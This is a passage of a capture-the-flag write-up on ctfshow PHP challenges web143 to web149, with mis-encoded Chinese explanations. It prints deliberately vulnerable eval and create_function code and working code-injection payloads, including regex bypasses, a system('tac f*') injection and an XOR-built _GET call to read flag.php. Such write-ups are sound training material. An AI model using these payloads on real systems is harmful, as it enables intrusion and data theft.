number">0x0</span>        <span class="token number">16</span>è¿›åˆ¶<span class="token operator">?</span>v1<span class="token operator">=</span><span class="token number">0e123</span>    ç§‘å­¦è®¡æ•°æ³•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web143â€”â€”å¼‚æˆ–"><a href="#web143â€”â€”å¼‚æˆ–" class="headerlink" title="web143â€”â€”å¼‚æˆ–^"></a>web143â€”â€”å¼‚æˆ–^</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸ºäº†åœ¨returnä¸­ä¿è¯è¿ç®—ï¼Œæˆ‘ä»¬éœ€è¦ç”¨*æ¥å®ç°</p><h2 id="web144â€”â€”å–å-é…åˆÂ±å·"><a href="#web144â€”â€”å–å-é…åˆÂ±å·" class="headerlink" title="web144â€”â€”å–å~é…åˆÂ±å·"></a>web144â€”â€”å–å~é…åˆÂ±å·</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">1</span><span class="token operator">?</span><span class="token boolean">true</span><span class="token punctuation">:</span><span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web145â€”â€”ä¸‰ç›®è¿ç®—ç¬¦çš„å¦™ç”¨"><a href="#web145â€”â€”ä¸‰ç›®è¿ç®—ç¬¦çš„å¦™ç”¨" class="headerlink" title="web145â€”â€”ä¸‰ç›®è¿ç®—ç¬¦çš„å¦™ç”¨?:"></a>web145â€”â€”ä¸‰ç›®è¿ç®—ç¬¦çš„å¦™ç”¨?:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return 1?phpinfo():1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ˜¯å¯ä»¥è¿è¡Œå‡ºæ¥çš„</p><h2 id="web146â€”â€”ç­‰å·å’Œä½è¿ç®—"><a href="#web146â€”â€”ç­‰å·å’Œä½è¿ç®—" class="headerlink" title="web146â€”â€”ç­‰å·å’Œä½è¿ç®—"></a>web146â€”â€”ç­‰å·å’Œä½è¿ç®—</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">hlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆå¢åŠ äº†åˆ†å·çš„è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡æ³•ç”¨ä¸‰ç›®è¿ç®—ç¬¦äº†ï¼Œè¿™æ—¶å€™æƒ³åˆ°äº†ç­‰å·å’Œä½è¿ç®—ç¬¦</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return 1==phpinfo()||1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web147â€”â€”ä»£ç æ³¨å…¥"><a href="#web147â€”â€”ä»£ç æ³¨å…¥" class="headerlink" title="web147â€”â€”ä»£ç æ³¨å…¥"></a>web147â€”â€”ä»£ç æ³¨å…¥</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>åˆ†ææ­£åˆ™è¡¨è¾¾å¼ï¼š</strong><br><code>/i</code>ä¸åŒºåˆ†å¤§å°å†™<br><code>/s</code>åŒ¹é…ä»»ä½•ä¸å¯è§å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ï¼Œç­‰ä»·äº<code>[\f\n\r\t\v]</code><br><code>/D</code>å¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ</p><p><strong>create_function:</strong></p><p><a href="https://paper.seebug.org/755/" target="_blank" rel="noopener">å‚è€ƒè¿™ç¯‡æ–‡ç« ç¬¬ä¸€é“é¢˜</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ä¸»è¦ç”¨æ¥åˆ›å»ºåŒ¿åå‡½æ•°<span class="token punctuation">,</span>æœ‰æ—¶å€™åŒ¿åå‡½æ•°å¯ä»¥å‘æŒ¥å®ƒçš„ä½œç”¨ã€‚string <span class="token function">create_function</span>    <span class="token punctuation">(</span> string <span class="token variable">$args</span>   <span class="token punctuation">,</span> string <span class="token variable">$code</span>   <span class="token punctuation">)</span>string <span class="token variable">$args</span> å‚æ•°éƒ¨åˆ†string <span class="token variable">$code</span> æ–¹æ³•ä»£ç éƒ¨åˆ†ä¸¾ä¾‹ï¼š<span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$name'</span><span class="token punctuation">,</span><span class="token string">'echo $fname."Zhang"'</span><span class="token punctuation">)</span>ç±»ä¼¼äºï¼š<span class="token keyword">function</span> <span class="token function">fT</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token variable">$fname</span><span class="token punctuation">.</span><span class="token string">"Zhang"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»•è¿‡åŒ¹é…çš„æ–¹å¼å¾ˆç®€å•ï¼šéœ€è¦åœ¨å¼€å¤´æˆ–è€…ç»“å°¾æ‰¾åˆ°ä¸€ä¸€ä¸ªå­—ç¬¦åŒæ—¶ä¸å½±å“å‡½æ•°çš„æ­£å¸¸è°ƒç”¨</p><p>ç°åœºåˆ¶ä½œä¸€ä¸ªfuzzç”¨çš„å­—å…¸ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"ascii.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">129</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9]/isD'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9]/isD'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//$c = "æœªç¼–ç ï¼š".$a."ç»è¿‡ç¼–ç ï¼š".$b."\n";</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//echo $c;</span><span class="token punctuation">}</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå¤åˆ¶æœ¬é¢˜ç›®ä»£ç æœ¬åœ°æ­å»ºï¼šå¼€å§‹å¯»æ‰¾å‘½ä¸­å­—ç¬¦</p><p>å…ˆæ„é€ payloadï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token variable">$hackername</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"yn8rt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span><span class="token punctuation">}</span>æ‰€ä»¥ï¼š<span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span>'<span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"yn8rt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//')</span>payload<span class="token punctuation">:</span><span class="token operator">?</span>show<span class="token operator">=</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"yn8rt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>post<span class="token punctuation">:</span>ctf<span class="token operator">=</span><span class="token operator">%</span>create_function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€å§‹fuzzï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20210724144535.png" alt></p><p>payloadï¼š</p><p><code>?show=}system(&#39;tac f*&#39;);//</code></p><p><code>ctf=%5ccreate_function</code></p><p>è€Œäº‹å®ä¸Š%5cå°±æ˜¯<code>\</code>ï¼š</p><p>åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º\ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨\è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name()è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•</p><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&amp;\*\+\- ]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">get_ctfshow_fl0g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸­æ–‡å˜é‡ï¼š</p><pre><code>code=$å“ˆ=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$å“ˆ}[å“¼](${$å“ˆ}[å—¯]);&amp;å“¼=system&amp;å—¯=tac f*&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;; å¼‚æˆ–å‡ºæ¥çš„ç»“æœæ˜¯ _GET${_GET}[å“¼](${_GET}[å—¯]);&amp;å“¼=call_user_func&amp;å—¯=get_ctfshow_fl0g</code></pre><p>è¿™é‡Œæ˜¯ç›´æ¥ä¸€ä¸ªå›è°ƒï¼Œåˆ©ç”¨ç°æˆçš„å‡½æ•°æ¥è¯»å–flag.php</p><h2 id="web149â€”â€”æ¡ä»¶ç«äº‰"><a href="#web149â€”â€”æ¡ä»¶ç«äº‰" class="headerlink" title="web149â€”â€”æ¡ä»¶ç«äº‰"></a>web149â€”â€”æ¡ä»¶ç«äº‰</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//unlink() å‡½æ•°åˆ é™¤æ–‡ä»¶ã€‚</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token 